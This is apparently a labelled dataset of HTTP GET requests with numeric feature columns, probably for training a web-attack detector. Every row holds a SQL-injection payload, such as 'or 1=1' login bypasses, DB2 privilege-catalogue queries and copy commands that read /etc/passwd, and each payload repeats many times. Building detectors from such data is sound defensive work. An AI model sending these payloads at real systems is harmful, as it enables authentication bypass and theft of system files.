44,1,200,1852,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,6130,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,4998,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,2571,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3814,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,5096,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7108,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7536,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,1784,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,1117,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,5035,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,1819,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7451,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7583,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3700,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
57,1,200,5889,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7360,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,1121,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,6233,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,5674,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,6259,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4303,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7375,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4490,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,6696,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7612,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,2082,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,2480,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,3012,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,2194,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7168,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,3523,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7112,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7451,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,3172,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
63,1,200,1806,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1678,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1227,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,7092,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5052,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,7708,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4916,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1552,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1085,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4152,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3589,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2988,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4824,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6529,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2225,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5387,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4813,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1276,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2553,7,37,6,3,1,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
46,1,200,6735,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5405,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,6344,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,3210,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1065,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1830,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2337,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7804,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7179,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1624,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1864,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1956,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,6284,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2085,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7435,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7351,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4304,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4077,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7901,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4767,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4142,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,6166,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5640,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5760,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,6380,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5166,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,6792,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4163,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
55,1,200,1471,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,4751,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6281,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2237,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3463,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5899,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5989,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,7002,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6763,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1341,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1108,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,7244,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6776,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2351,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2556,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5344,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,7845,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1712,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2552,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1040,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,7492,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5339,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6310,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6898,7,30,6,4,1,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
32,1,200,6826,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,5036,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1043,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,2166,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1818,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,6118,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,2083,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,5415,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,5465,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,2561,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,6541,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,5575,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1944,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1464,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1640,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,5855,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,3725,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1089,7,9,5,2,1,GET ?id=admin" or 1=1/* HTTP/1.1
32,1,200,1651,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2468,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,3837,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,1341,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,1018,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,4017,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2412,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,7403,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5280,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2582,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,7869,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,3335,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,3383,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2153,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,1849,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,7023,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,7172,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5958,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,6013,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,1482,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,1176,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5556,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2537,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,3008,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,4280,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,6218,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,6909,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5708,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,7006,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,6415,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
27,1,200,4625,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,7676,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,4812,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,4889,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
